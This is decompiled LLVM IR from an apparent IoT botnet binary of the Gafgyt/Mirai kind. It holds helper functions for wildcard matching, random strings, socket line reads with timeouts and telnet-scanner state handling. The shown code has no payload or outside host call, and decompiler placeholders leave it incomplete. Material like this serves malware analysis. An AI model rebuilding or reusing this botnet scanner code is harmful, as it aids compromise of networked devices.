  %v4_8048cd56 = ptrtoint i8* %arg1 to i32
  %v2_8048cd87 = load i8, i8* %arg1, align 1
  %v4_8048cda11 = icmp eq i8 %v2_8048cd87, 0
  br i1 %v4_8048cda11, label %dec_label_pc_8048ce4, label %dec_label_pc_8048cde

dec_label_pc_8048cb4:                             ; preds = %dec_label_pc_8048cde
  %v2_8048cb9 = mul i32 %stack_var_-8.012, 16
  %v2_8048cbf = load i8, i8* %stack_var_4.013, align 1
  %v3_8048cbf = zext i8 %v2_8048cbf to i32
  %v1_8048cc6 = mul nuw nsw i32 %v3_8048cbf, 4
  %v2_8048cc6 = add i32 %v1_8048cc6, ptrtoint (i32* @global_var_8055d60.17 to i32)
  %v3_8048cc6 = inttoptr i32 %v2_8048cc6 to i32*
  %v4_8048cc6 = load i32, i32* %v3_8048cc6, align 4
  %v2_8048ccd = or i32 %v4_8048cc6, %v2_8048cb9
  %v5_8048cd2 = add i32 %v4_8048cd514, 1
  %v22_8048cd2 = inttoptr i32 %v5_8048cd2 to i8*
  %v2_8048cd8 = load i8, i8* %v22_8048cd2, align 1
  %v4_8048cda = icmp eq i8 %v2_8048cd8, 0
  br i1 %v4_8048cda, label %dec_label_pc_8048ce4, label %dec_label_pc_8048cde

dec_label_pc_8048cde:                             ; preds = %entry, %dec_label_pc_8048cb4
  %v4_8048cd514 = phi i32 [ %v5_8048cd2, %dec_label_pc_8048cb4 ], [ %v4_8048cd56, %entry ]
  %stack_var_4.013 = phi i8* [ %v22_8048cd2, %dec_label_pc_8048cb4 ], [ %arg1, %entry ]
  %stack_var_-8.012 = phi i32 [ %v2_8048ccd, %dec_label_pc_8048cb4 ], [ 0, %entry ]
  %v5_8048cde = icmp slt i32 %stack_var_-8.012, 0
  %v1_8048ce2 = icmp eq i1 %v5_8048cde, false
  br i1 %v1_8048ce2, label %dec_label_pc_8048cb4, label %dec_label_pc_8048ce4

dec_label_pc_8048ce4:                             ; preds = %dec_label_pc_8048cb4, %dec_label_pc_8048cde, %entry
  %stack_var_-8.0.lcssa = phi i32 [ 0, %entry ], [ %stack_var_-8.012, %dec_label_pc_8048cde ], [ %v2_8048ccd, %dec_label_pc_8048cb4 ]
  ret i32 %stack_var_-8.0.lcssa

; uselistorder directives
  uselistorder i32 %stack_var_-8.012, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8048ce4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8048cde, { 1, 0 }
}

define i32 @wildString(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp14 = inttoptr i32 %arg2 to i8*
  %stack_var_-8 = alloca i32, align 4
  %v0_8048cec = load i32, i32* @ebx, align 4
  store i32 %v0_8048cec, i32* %stack_var_-8, align 4
  %v4_8048cf0 = ptrtoint i8* %arg1 to i32
  %v2_8048cf3 = load i8, i8* %arg1, align 1
  %v12_8048cff = icmp eq i8 %v2_8048cf3, 42
  br i1 %v12_8048cff, label %dec_label_pc_8048d2a, label %dec_label_pc_8048d05

dec_label_pc_8048d05:                             ; preds = %entry
  %v12_8048d05 = icmp eq i8 %v2_8048cf3, 63
  br i1 %v12_8048d05, label %dec_label_pc_8048d7c, label %dec_label_pc_8048d0b

dec_label_pc_8048d0b:                             ; preds = %dec_label_pc_8048d05
  %v4_8048d0b = icmp eq i8 %v2_8048cf3, 0
  br i1 %v4_8048d0b, label %dec_label_pc_8048d16, label %dec_label_pc_8048db6

dec_label_pc_8048d16:                             ; preds = %dec_label_pc_8048d0b
  %v2_8048d19 = load i8, i8* %tmp14, align 1
  %v3_8048d19 = zext i8 %v2_8048d19 to i32
  br label %dec_label_pc_8048e17

dec_label_pc_8048d2a:                             ; preds = %entry
  %v1_8048d2d = add i32 %v4_8048cf0, 1
  %v5_8048d34 = inttoptr i32 %v1_8048d2d to i8*
  %v5_8048d35 = call i32 @wildString(i8* %v5_8048d34, i32 %arg2)
  %v1_8048d3d = icmp eq i32 %v5_8048d35, 0
  br i1 %v1_8048d3d, label %dec_label_pc_8048d6a, label %dec_label_pc_8048d41

dec_label_pc_8048d41:                             ; preds = %dec_label_pc_8048d2a
  %v2_8048d44 = load i8, i8* %tmp14, align 1
  %v4_8048d46 = icmp eq i8 %v2_8048d44, 0
  br i1 %v4_8048d46, label %dec_label_pc_8048d71, label %dec_label_pc_8048d4a

dec_label_pc_8048d4a:                             ; preds = %dec_label_pc_8048d41
  %v1_8048d4d = add i32 %arg2, 1
  %v5_8048d55 = call i32 @wildString(i8* nonnull %arg1, i32 %v1_8048d4d)
  %v1_8048d5d = icmp eq i32 %v5_8048d55, 0
  br i1 %v1_8048d5d, label %dec_label_pc_8048d6a, label %dec_label_pc_8048d71

dec_label_pc_8048d6a:                             ; preds = %dec_label_pc_8048d4a, %dec_label_pc_8048d2a
  br label %dec_label_pc_8048d71

dec_label_pc_8048d71:                             ; preds = %dec_label_pc_8048d41, %dec_label_pc_8048d4a, %dec_label_pc_8048d6a
  %storemerge8 = phi i32 [ 0, %dec_label_pc_8048d6a ], [ 1, %dec_label_pc_8048d4a ], [ 1, %dec_label_pc_8048d41 ]
  br label %dec_label_pc_8048e17

dec_label_pc_8048d7c:                             ; preds = %dec_label_pc_8048d05
  %v2_8048d7f = load i8, i8* %tmp14, align 1
  %v4_8048d81 = icmp eq i8 %v2_8048d7f, 0
  br i1 %v4_8048d81, label %dec_label_pc_8048dae, label %dec_label_pc_8048d85

dec_label_pc_8048d85:                             ; preds = %dec_label_pc_8048d7c
  %v1_8048d88 = add i32 %arg2, 1
  %v1_8048d8c = add i32 %v4_8048cf0, 1
  %v5_8048d91 = inttoptr i32 %v1_8048d8c to i8*
  %v5_8048d92 = call i32 @wildString(i8* %v5_8048d91, i32 %v1_8048d88)
  %v1_8048d9a = icmp ne i32 %v5_8048d92, 0
  %. = zext i1 %v1_8048d9a to i32
  br label %dec_label_pc_8048dae

dec_label_pc_8048dae:                             ; preds = %dec_label_pc_8048d85, %dec_label_pc_8048d7c
  %storemerge5 = phi i32 [ 1, %dec_label_pc_8048d7c ], [ %., %dec_label_pc_8048d85 ]
  br label %dec_label_pc_8048e17

dec_label_pc_8048db6:                             ; preds = %dec_label_pc_8048d0b
  %v2_8048db9 = load i8, i8* %arg1, align 1
  %v3_8048db9 = zext i8 %v2_8048db9 to i32
  %v2_8048dc4 = call i32 @__GI_toupper(i32 %v3_8048db9)
  store i32 %v2_8048dc4, i32* @ebx, align 4
  %v2_8048dd1 = load i8, i8* %tmp14, align 1
  %v3_8048dd1 = zext i8 %v2_8048dd1 to i32
  %v2_8048ddc = call i32 @__GI_toupper(i32 %v3_8048dd1)
  %v0_8048de4 = load i32, i32* @ebx, align 4
  %v12_8048de4 = icmp eq i32 %v0_8048de4, %v2_8048ddc
  %v1_8048de6 = icmp eq i1 %v12_8048de4, false
  br i1 %v1_8048de6, label %dec_label_pc_8048e11, label %dec_label_pc_8048de8

dec_label_pc_8048de8:                             ; preds = %dec_label_pc_8048db6
  %v1_8048deb = add i32 %arg2, 1
  %v1_8048def = add i32 %v4_8048cf0, 1
  %v5_8048df4 = inttoptr i32 %v1_8048def to i8*
  %v5_8048df5 = call i32 @wildString(i8* %v5_8048df4, i32 %v1_8048deb)
  %v1_8048dfd = icmp ne i32 %v5_8048df5, 0
  %.9 = zext i1 %v1_8048dfd to i32
  br label %dec_label_pc_8048e11

dec_label_pc_8048e11:                             ; preds = %dec_label_pc_8048de8, %dec_label_pc_8048db6
  %storemerge = phi i32 [ 1, %dec_label_pc_8048db6 ], [ %.9, %dec_label_pc_8048de8 ]
  br label %dec_label_pc_8048e17

dec_label_pc_8048e17:                             ; preds = %dec_label_pc_8048dae, %dec_label_pc_8048d71, %dec_label_pc_8048d16, %dec_label_pc_8048e11
  %stack_var_-24.0 = phi i32 [ %storemerge8, %dec_label_pc_8048d71 ], [ %storemerge5, %dec_label_pc_8048dae ], [ %v3_8048d19, %dec_label_pc_8048d16 ], [ %storemerge, %dec_label_pc_8048e11 ]
  %v3_8048e1a = load i32, i32* %stack_var_-8, align 4
  store i32 %v3_8048e1a, i32* @ebx, align 4
  ret i32 %stack_var_-24.0

; uselistorder directives
  uselistorder i8 %v2_8048cf3, { 2, 0, 1 }
  uselistorder i32 %v4_8048cf0, { 0, 2, 1 }
  uselistorder i8* %tmp14, { 3, 1, 0, 2 }
  uselistorder i32 %arg2, { 0, 3, 2, 1, 4 }
  uselistorder i8* %arg1, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_8048e17, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8048d71, { 2, 1, 0 }
}

define i32 @getHost(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %v1_8048e2c = call i32 @inet_addr(i32 %arg1)
  store i32 %v1_8048e2c, i32* %arg2, align 4
  %v10_8048e40 = icmp eq i32 %v1_8048e2c, -1
  %. = zext i1 %v10_8048e40 to i32
  ret i32 %.
}

define i32 @uppercase(i8* %arg1) local_unnamed_addr {
entry:
  %v4_8048e827 = ptrtoint i8* %arg1 to i32
  %v2_8048e858 = load i8, i8* %arg1, align 1
  %v3_8048e859 = zext i8 %v2_8048e858 to i32
  %v5_8048e8510 = and i32 %v4_8048e827, -256
  %v6_8048e8511 = or i32 %v3_8048e859, %v5_8048e8510
  %v4_8048e8712 = icmp eq i8 %v2_8048e858, 0
  %v1_8048e8913 = icmp eq i1 %v4_8048e8712, false
  br i1 %v1_8048e8913, label %dec_label_pc_8048e62, label %dec_label_pc_8048e8b

dec_label_pc_8048e62:                             ; preds = %entry, %dec_label_pc_8048e62.dec_label_pc_8048e62_crit_edge
  %v4_8048e8215 = phi i32 [ %v5_8048e7f, %dec_label_pc_8048e62.dec_label_pc_8048e62_crit_edge ], [ %v4_8048e827, %entry ]
  %stack_var_4.014 = phi i8* [ %v22_8048e7f, %dec_label_pc_8048e62.dec_label_pc_8048e62_crit_edge ], [ %arg1, %entry ]
  %v2_8048e65 = load i8, i8* %stack_var_4.014, align 1
  %v3_8048e65 = zext i8 %v2_8048e65 to i32
  %v1_8048e70 = call i32 @__GI_toupper(i32 %v3_8048e65)
  %v1_8048e7d = trunc i32 %v1_8048e70 to i8
  store i8 %v1_8048e7d, i8* %stack_var_4.014, align 1
  %v5_8048e7f = add i32 %v4_8048e8215, 1
  %v22_8048e7f = inttoptr i32 %v5_8048e7f to i8*
  %v2_8048e85 = load i8, i8* %v22_8048e7f, align 1
  %v4_8048e87 = icmp eq i8 %v2_8048e85, 0
  %v1_8048e89 = icmp eq i1 %v4_8048e87, false
  br i1 %v1_8048e89, label %dec_label_pc_8048e62.dec_label_pc_8048e62_crit_edge, label %dec_label_pc_8048e82.dec_label_pc_8048e8b_crit_edge

dec_label_pc_8048e62.dec_label_pc_8048e62_crit_edge: ; preds = %dec_label_pc_8048e62
  br label %dec_label_pc_8048e62

dec_label_pc_8048e82.dec_label_pc_8048e8b_crit_edge: ; preds = %dec_label_pc_8048e62
  %v3_8048e85 = zext i8 %v2_8048e85 to i32
  %v5_8048e85 = and i32 %v5_8048e7f, -256
  %v6_8048e85 = or i32 %v3_8048e85, %v5_8048e85
  br label %dec_label_pc_8048e8b

dec_label_pc_8048e8b:                             ; preds = %dec_label_pc_8048e82.dec_label_pc_8048e8b_crit_edge, %entry
  %v6_8048e85.lcssa = phi i32 [ %v6_8048e85, %dec_label_pc_8048e82.dec_label_pc_8048e8b_crit_edge ], [ %v6_8048e8511, %entry ]
  ret i32 %v6_8048e85.lcssa

; uselistorder directives
  uselistorder i8 %v2_8048e85, { 1, 0 }
  uselistorder i8* %v22_8048e7f, { 1, 0 }
  uselistorder i32 %v5_8048e7f, { 1, 2, 0 }
  uselistorder i8* %stack_var_4.014, { 1, 0 }
  uselistorder label %dec_label_pc_8048e62, { 1, 0 }
}

define i32 @makeRandomStr(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8048e8d = load i32, i32* @ebp, align 4
  store i32 %v0_8048e8d, i32* %stack_var_-4, align 4
  %v0_8048e91 = load i32, i32* @ebx, align 4
  store i32 %v0_8048e91, i32* %stack_var_-12, align 4
  %v5_8048eaa = ptrtoint i8* %arg1 to i32
  %v5_8048eeb21 = icmp sgt i32 %arg2, 0
  br i1 %v5_8048eeb21, label %dec_label_pc_8048ea5, label %dec_label_pc_8048eed

dec_label_pc_8048ea5:                             ; preds = %entry, %dec_label_pc_8048ea5
  %storemerge22 = phi i32 [ %v4_8048ee2, %dec_label_pc_8048ea5 ], [ 0, %entry ]
  %v6_8048eaa = add i32 %storemerge22, %v5_8048eaa
  store i32 %v6_8048eaa, i32* @ebx, align 4
  %v1_8048ead = call i32 @rand_cmwc(i32 %storemerge22)
  store i32 %v1_8048ead, i32* @ecx, align 4
  %v2_8048ebd = udiv i32 %v1_8048ead, 26
  %tmp = mul i32 %v2_8048ebd, -10
  %v2_8048ed5 = add i32 %v1_8048ead, %tmp
  %v1_8048edd = add i32 %v2_8048ed5, 65
  %v11_8048edd = trunc i32 %v1_8048edd to i8
  %v2_8048ee0 = load i32, i32* @ebx, align 4
  %v3_8048ee0 = inttoptr i32 %v2_8048ee0 to i8*
  store i8 %v11_8048edd, i8* %v3_8048ee0, align 1
  %v4_8048ee2 = add nuw nsw i32 %storemerge22, 1
  %exitcond = icmp eq i32 %v4_8048ee2, %arg2
  br i1 %exitcond, label %dec_label_pc_8048ee5.dec_label_pc_8048eed_crit_edge, label %dec_label_pc_8048ea5

dec_label_pc_8048ee5.dec_label_pc_8048eed_crit_edge: ; preds = %dec_label_pc_8048ea5
  %v2_8048ef0.pre = load i32, i32* %stack_var_-12, align 4
  %v2_8048ef2.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8048eed

dec_label_pc_8048eed:                             ; preds = %dec_label_pc_8048ee5.dec_label_pc_8048eed_crit_edge, %entry
  %v2_8048ef2 = phi i32 [ %v2_8048ef2.pre, %dec_label_pc_8048ee5.dec_label_pc_8048eed_crit_edge ], [ %v0_8048e8d, %entry ]
  %v2_8048ef0 = phi i32 [ %v2_8048ef0.pre, %dec_label_pc_8048ee5.dec_label_pc_8048eed_crit_edge ], [ %v0_8048e91, %entry ]
  %storemerge.lcssa = phi i32 [ %arg2, %dec_label_pc_8048ee5.dec_label_pc_8048eed_crit_edge ], [ 0, %entry ]
  store i32 %v2_8048ef0, i32* @ebx, align 4
  store i32 %v2_8048ef2, i32* @ebp, align 4
  ret i32 %storemerge.lcssa

; uselistorder directives
  uselistorder i32 %v4_8048ee2, { 1, 0 }
  uselistorder i32 %storemerge22, { 1, 0, 2 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8048ea5, { 1, 0 }
}

define i32 @recvLine() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %tmp11 = call i32 @__decompiler_undefined_function_0()
  %tmp15 = call i32 @__decompiler_undefined_function_0()
  %tmp19 = call i32 @__decompiler_undefined_function_0()
  %tmp20 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-177 = alloca i8, align 1
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8048ef7 = load i32, i32* @edi, align 4
  store i32 %v0_8048ef7, i32* %stack_var_-8, align 4
  %v1_8048f04 = inttoptr i32 %tmp19 to i8*
  %v1_8048f09 = and i32 %tmp19, -256
  store i32 %v1_8048f09, i32* %eax.global-to-local, align 4
  %v5_8048f0b = call i8* @_memset(i8* %v1_8048f04, i32 %v1_8048f09, i32 %tmp20)
  store i32 30, i32* %stack_var_-176, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v2_8048f2b = ptrtoint i32* %stack_var_-168 to i32
  %tmp36 = bitcast i32* %stack_var_-168 to i8*
  store i32 %v2_8048f2b, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v5_8048f32 = call i8* @_memset(i8* %tmp36, i32 0, i32 32)
  %v2_8048f3f = udiv i32 %tmp15, 32
  %v1_8048f45 = urem i32 %tmp15, 32
  store i32 %v1_8048f45, i32* %eax.global-to-local, align 4
  %v0_8048f48 = load i32, i32* @ebp, align 4
  %v2_8048f48 = mul nuw nsw i32 %v2_8048f3f, 4
  %v3_8048f48 = add nsw i32 %v2_8048f48, -164
  %v4_8048f48 = add i32 %v3_8048f48, %v0_8048f48
  %v5_8048f48 = inttoptr i32 %v4_8048f48 to i32*
  %v6_8048f48 = load i32, i32* %v5_8048f48, align 4
  %v9_8048f48 = shl i32 1, %v1_8048f45
  %v12_8048f48 = or i32 %v6_8048f48, %v9_8048f48
  store i32 %v12_8048f48, i32* %v5_8048f48, align 4
  %v1_8048f53 = add i32 %tmp15, 1
  %v2_8048f57 = ptrtoint i32* %stack_var_-176 to i32
  store i32 %v2_8048f2b, i32* %eax.global-to-local, align 4
  %v5_8048f6f = call i32 @__libc_select(i32 %v1_8048f53, i32 %v2_8048f2b, i32 0, i32 %v2_8048f2b, i32 %v2_8048f57)
  store i32 %v5_8048f6f, i32* %eax.global-to-local, align 4
  %tmp37 = icmp slt i32 %v5_8048f6f, 1
  %tmp38 = icmp eq i1 %tmp37, false
  br i1 %tmp38, label %dec_label_pc_804901f, label %dec_label_pc_8049015.preheader

dec_label_pc_8049015.preheader:                   ; preds = %entry
  %v7_804901945 = icmp sgt i32 %tmp11, 9
  br i1 %v7_804901945, label %dec_label_pc_804901f, label %dec_label_pc_8048f89.lr.ph

dec_label_pc_8048f89.lr.ph:                       ; preds = %dec_label_pc_8049015.preheader
  br label %dec_label_pc_8048f89

dec_label_pc_8048f89:                             ; preds = %dec_label_pc_8048f89.lr.ph, %dec_label_pc_8049012
  %stack_var_-36.046 = phi i32 [ %tmp11, %dec_label_pc_8048f89.lr.ph ], [ %v4_8049012, %dec_label_pc_8049012 ]
  %v0_8048f89 = load i32, i32* @global_var_805a160.18, align 32
  store i32 %v0_8048f89, i32* %eax.global-to-local, align 4
  %v3_8048f97 = call i32 @Rootsprintf(i32 %v0_8048f89, i32 ptrtoint ([5 x i8]* @global_var_8056160.19 to i32))
  store i32 30, i32* %stack_var_-176, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 %v2_8048f2b, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v5_8048fc4 = call i8* @_memset(i8* %tmp36, i32 0, i32 32)
  store i32 %v1_8048f45, i32* %eax.global-to-local, align 4
  %v0_8048fda = load i32, i32* @ebp, align 4
  %v4_8048fda = add i32 %v3_8048f48, %v0_8048fda
  %v5_8048fda = inttoptr i32 %v4_8048fda to i32*
  %v6_8048fda = load i32, i32* %v5_8048fda, align 4
  %v12_8048fda = or i32 %v6_8048fda, %v9_8048f48
  store i32 %v12_8048fda, i32* %v5_8048fda, align 4
  store i32 %v2_8048f2b, i32* %eax.global-to-local, align 4
  %v5_8049001 = call i32 @__libc_select(i32 %v1_8048f53, i32 %v2_8048f2b, i32 0, i32 %v2_8048f2b, i32 %v2_8048f57)
  store i32 %v5_8049001, i32* %eax.global-to-local, align 4
  %tmp39 = icmp slt i32 %v5_8049001, 1
  %tmp40 = icmp eq i1 %tmp39, false
  br i1 %tmp40, label %dec_label_pc_804901f, label %dec_label_pc_8049012

dec_label_pc_8049012:                             ; preds = %dec_label_pc_8048f89
  %v4_8049012 = add nsw i32 %stack_var_-36.046, 1
  %v7_8049019 = icmp sgt i32 %stack_var_-36.046, 8
  br i1 %v7_8049019, label %dec_label_pc_804901f, label %dec_label_pc_8048f89

dec_label_pc_804901f:                             ; preds = %dec_label_pc_8049015.preheader, %dec_label_pc_8048f89, %dec_label_pc_8049012, %entry
  store i32 %tmp19, i32* %eax.global-to-local, align 4
  %v2_8049037 = ptrtoint i8* %stack_var_-177 to i32
  br label %dec_label_pc_8049079

dec_label_pc_804902e:                             ; preds = %dec_label_pc_8049079
  %v0_804902e = load i32, i32* @global_var_805a160.18, align 32
  store i32 %v0_804902e, i32* %eax.global-to-local, align 4
  %v5_804903f = call i32 @__libc_recv(i32 %v0_804902e, i32 %v2_8049037, i32 1, i32 0)
  store i32 %v5_804903f, i32* %eax.global-to-local, align 4
  %v9_8049047 = icmp eq i32 %v5_804903f, 1
  br i1 %v9_8049047, label %dec_label_pc_804905e, label %dec_label_pc_804904c

dec_label_pc_804904c:                             ; preds = %dec_label_pc_804902e
  %v4_804904c = ptrtoint i8* %stack_var_-32.0 to i32
  store i32 %v4_804904c, i32* %eax.global-to-local, align 4
  store i8 0, i8* %stack_var_-32.0, align 1
  br label %dec_label_pc_8049096

dec_label_pc_804905e:                             ; preds = %dec_label_pc_804902e
  %v3_804905e = load i8, i8* %stack_var_-177, align 1
  %v4_804905e = sext i8 %v3_804905e to i32
  store i32 %v4_804905e, i32* %eax.global-to-local, align 4
  %v4_8049064 = ptrtoint i8* %stack_var_-32.0 to i32
  store i8 %v3_804905e, i8* %stack_var_-32.0, align 1
  %v5_8049069 = add i32 %v4_8049064, 1
  %v22_8049069 = inttoptr i32 %v5_8049069 to i8*
  %v3_804906c = load i8, i8* %stack_var_-177, align 1
  %v4_804906c = sext i8 %v3_804906c to i32
  %v6_804906c = load i32, i32* %eax.global-to-local, align 4
  %v7_804906c = and i32 %v6_804906c, -256
  %v8_804906c = or i32 %v7_804906c, %v4_804906c
  store i32 %v8_804906c, i32* %eax.global-to-local, align 4
  %v10_8049072 = icmp eq i8 %v3_804906c, 10
  br i1 %v10_8049072, label %dec_label_pc_8049087, label %dec_label_pc_8049076

dec_label_pc_8049076:                             ; preds = %dec_label_pc_804905e
  %v4_8049076 = add i32 %stack_var_-28.0, 1
  br label %dec_label_pc_8049079

dec_label_pc_8049079:                             ; preds = %dec_label_pc_804901f, %dec_label_pc_8049076
  %v7_804907d = phi i32 [ %tmp19, %dec_label_pc_804901f ], [ %v8_804906c, %dec_label_pc_8049076 ]
  %stack_var_-32.0 = phi i8* [ %v1_8048f04, %dec_label_pc_804901f ], [ %v22_8049069, %dec_label_pc_8049076 ]
  %stack_var_-28.0 = phi i32 [ 0, %dec_label_pc_804901f ], [ %v4_8049076, %dec_label_pc_8049076 ]
  %stack_var_12.0 = phi i32 [ %tmp20, %dec_label_pc_804901f ], [ %v4_8049079, %dec_label_pc_8049076 ]
  %v4_8049079 = add i32 %stack_var_12.0, -1
  %v9_8049079 = sub i32 0, %stack_var_12.0
  %v10_8049079 = and i32 %stack_var_12.0, %v9_8049079
  %v11_8049079 = icmp slt i32 %v10_8049079, 0
  %v12_8049079 = icmp eq i32 %v4_8049079, 0
  %v13_8049079 = icmp slt i32 %v4_8049079, 0
  %v3_804907d = icmp eq i1 %v13_8049079, %v11_8049079
  %v4_804907d = icmp eq i1 %v12_8049079, false
  %v5_804907d = and i1 %v4_804907d, %v3_804907d
  %v6_804907d = zext i1 %v5_804907d to i32
  %v8_804907d = and i32 %v7_804907d, -256
  %v9_804907d = or i32 %v6_804907d, %v8_804907d
  store i32 %v9_804907d, i32* %eax.global-to-local, align 4
  %v4_8049083 = icmp eq i1 %v5_804907d, false
  %v1_8049085 = icmp eq i1 %v4_8049083, false
  br i1 %v1_8049085, label %dec_label_pc_804902e, label %dec_label_pc_8049087

dec_label_pc_8049087:                             ; preds = %dec_label_pc_804905e, %dec_label_pc_8049079
  %stack_var_-32.1 = phi i8* [ %v22_8049069, %dec_label_pc_804905e ], [ %stack_var_-32.0, %dec_label_pc_8049079 ]
  store i8 0, i8* %stack_var_-32.1, align 1
  store i32 %stack_var_-28.0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8049096

dec_label_pc_8049096:                             ; preds = %dec_label_pc_804904c, %dec_label_pc_8049087
  %storemerge = phi i32 [ -1, %dec_label_pc_804904c ], [ %stack_var_-28.0, %dec_label_pc_8049087 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  %v3_804909c = load i32, i32* %stack_var_-8, align 4
  store i32 %v3_804909c, i32* @edi, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v4_8049079, { 2, 1, 0 }
  uselistorder i32 %stack_var_12.0, { 1, 0, 2 }
  uselistorder i32 %stack_var_-28.0, { 1, 0, 2 }
  uselistorder i8* %stack_var_-32.0, { 2, 0, 1, 3, 4 }
  uselistorder i8* %v22_8049069, { 1, 0 }
  uselistorder i32 %v1_8048f45, { 2, 1, 0 }
  uselistorder i32 %v2_8048f2b, { 0, 3, 4, 5, 1, 2, 6, 7 }
  uselistorder i32* %stack_var_-176, { 0, 2, 1 }
  uselistorder i8* %stack_var_-177, { 2, 1, 0 }
  uselistorder i32 %tmp20, { 1, 0 }
  uselistorder i32 %tmp19, { 0, 3, 1, 2 }
  uselistorder i32 %tmp15, { 2, 1, 0 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 8, 2, 3, 4, 5, 6, 7, 9, 10, 11, 12, 13, 19, 14, 15, 16, 17, 18 }
  uselistorder label %dec_label_pc_8049096, { 1, 0 }
  uselistorder label %dec_label_pc_8049087, { 1, 0 }
  uselistorder label %dec_label_pc_8049079, { 1, 0 }
  uselistorder label %dec_label_pc_804901f, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_8048f89, { 1, 0 }
}

define i32 @get_telstate_host() local_unnamed_addr {
entry:
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %v1_80490aa = add i32 %tmp1, 4
  %v2_80490aa = inttoptr i32 %v1_80490aa to i32*
  %v3_80490aa = load i32, i32* %v2_80490aa, align 4
  %v1_80490b6 = call i32 @__GI_inet_ntoa(i32 %v3_80490aa)
  ret i32 %v1_80490b6
}

define i32 @read_until_response(i32 %arg1) local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %v0_80490c3 = load i32, i32* @edi, align 4
  store i32 %v0_80490c3, i32* %stack_var_-8, align 4
  %v1_80490cd = inttoptr i32 %tmp4 to i8*
  store i32 %tmp4, i32* @edi, align 4
  %v1_80490d2 = and i32 %tmp4, -256
  %v5_80490d4 = call i8* @_memset(i8* %v1_80490cd, i32 %v1_80490d2, i32 %tmp5)
  %v4_80490e2 = call i32 @read_with_timeout(i32 %arg1, i32 %tmp3, i32 %tmp4, i32 %tmp5)
  %v2_80490f6 = inttoptr i32 %tmp to i32*
  %v3_80490f6 = call i32 @contains_string(i32 %tmp4, i32* %v2_80490f6)
  %v1_80490fe = icmp ne i32 %v3_80490f6, 0
  %storemerge = zext i1 %v1_80490fe to i32
  %v3_8049115 = load i32, i32* %stack_var_-8, align 4
  store i32 %v3_8049115, i32* @edi, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %tmp4, { 4, 0, 1, 3, 2 }
}

define i32 @read_with_timeout(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  store i32 0, i32* %stack_var_-152, align 4
  %v2_8049141 = ptrtoint i32* %stack_var_-144 to i32
  %tmp21 = bitcast i32* %stack_var_-144 to i8*
  store i1 false, i1* @df, align 1
  %v5_8049148 = call i8* @_memset(i8* %tmp21, i32 0, i32 32)
  %v2_8049155 = udiv i32 %arg1, 32
  %v1_804915b = urem i32 %arg1, 32
  %v0_804915e = load i32, i32* @ebp, align 4
  %v2_804915e = mul nuw nsw i32 %v2_8049155, 4
  %v3_804915e = add nsw i32 %v2_804915e, -140
  %v4_804915e = add i32 %v3_804915e, %v0_804915e
  %v5_804915e = inttoptr i32 %v4_804915e to i32*
  %v6_804915e = load i32, i32* %v5_804915e, align 4
  %v9_804915e = shl i32 1, %v1_804915b
  %v12_804915e = or i32 %v6_804915e, %v9_804915e
  store i32 %v12_804915e, i32* %v5_804915e, align 4
  %v1_8049169 = add i32 %arg1, 1
  %v2_804916d = ptrtoint i32* %stack_var_-152 to i32
  %v5_8049180 = call i32 @__libc_select(i32 %v1_8049169, i32 %v2_8049141, i32 0, i32 0, i32 %v2_804916d)
  %tmp22 = icmp slt i32 %v5_8049180, 1
  %tmp23 = icmp eq i1 %tmp22, false
  br i1 %tmp23, label %dec_label_pc_8049198, label %dec_label_pc_80491b2

dec_label_pc_8049198:                             ; preds = %entry
  %v4_80491a4 = call i32 @__libc_recv(i32 %arg1, i32 %arg3, i32 %arg4, i32 0)
  br label %dec_label_pc_80491b2

dec_label_pc_80491b2:                             ; preds = %entry, %dec_label_pc_8049198
  %storemerge = phi i32 [ %v4_80491a4, %dec_label_pc_8049198 ], [ 0, %entry ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32* %stack_var_-152, { 1, 0 }
  uselistorder i32 %arg1, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_80491b2, { 1, 0 }
}

define i32 @advance_state(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp2 = ptrtoint i32* %arg1 to i32
  %v4_80491c3 = icmp eq i32 %arg2, 0
  %v6_80491c3 = trunc i32 %arg2 to i8
  %v1_80491c7 = icmp eq i1 %v4_80491c3, false
  br i1 %v1_80491c7, label %entry.dec_label_pc_80491da_crit_edge, label %dec_label_pc_80491c9

entry.dec_label_pc_80491da_crit_edge:             ; preds = %entry
  br label %dec_label_pc_80491da

dec_label_pc_80491c9:                             ; preds = %entry
  %v2_80491cc = load i32, i32* %arg1, align 4
  %v1_80491d2 = call i32 @__libc_close(i32 %v2_80491cc)
  br label %dec_label_pc_80491da

dec_label_pc_80491da:                             ; preds = %entry.dec_label_pc_80491da_crit_edge, %dec_label_pc_80491c9
